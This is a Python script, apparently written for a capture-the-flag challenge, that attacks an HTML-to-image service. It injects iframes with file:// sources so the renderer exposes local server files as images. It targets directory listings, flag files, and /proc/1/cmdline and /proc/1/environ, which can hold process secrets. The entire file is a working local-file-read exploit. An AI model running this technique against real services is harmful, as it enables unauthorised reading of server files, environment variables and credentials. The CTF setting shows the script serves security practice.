import requests, io, zipfile

BASE = 'http://fad4fa65501e0c52f811e82ff7b1afca.playat.flagyard.com'
s = requests.Session()
s.headers.update({'User-Agent': 'Mozilla/5.0'})

def readfile(path, name):
    html = f'<pre style="font-size:22px;white-space:pre-wrap;word-break:break-all">' \
           f'<iframe src="file://{path}" style="width:1400px;height:1600px;border:0"></iframe></pre>'
    # actually iframe better alone
    html = f'<iframe src="file://{path}" style="width:1500px;height:1700px;border:0"></iframe>'
    r = s.post(BASE + '/html-to-image', json={'pages': [html]}, timeout=40)
    if r.status_code == 200 and r.headers.get('Content-Type','').startswith('application/zip'):
        z = zipfile.ZipFile(io.BytesIO(r.content))
        for n in z.namelist():
            data = z.read(n)
            out = f'f:/mission-git-hackss/mission-git-hackss/read_{name}.jpg'
            with open(out, 'wb') as f:
                f.write(data)
            print(f'{name} ({path}): {len(data)} bytes')
    else:
        print(f'{name} ({path}): [{r.status_code}] {r.text[:120]}')

# Directory listing works in file:// on chromium
for path, name in [
    ('/home/app/', 'home_app'),
    ('/home/runner/', 'home_runner'),
    ('/app/', 'app_dir'),
    ('/flag', 'flag_root'),
    ('/flag.txt', 'flagtxt_root'),
    ('/proc/1/cmdline', 'proc_cmdline'),
    ('/proc/1/environ', 'proc_environ'),
]:
    readfile(path, name)
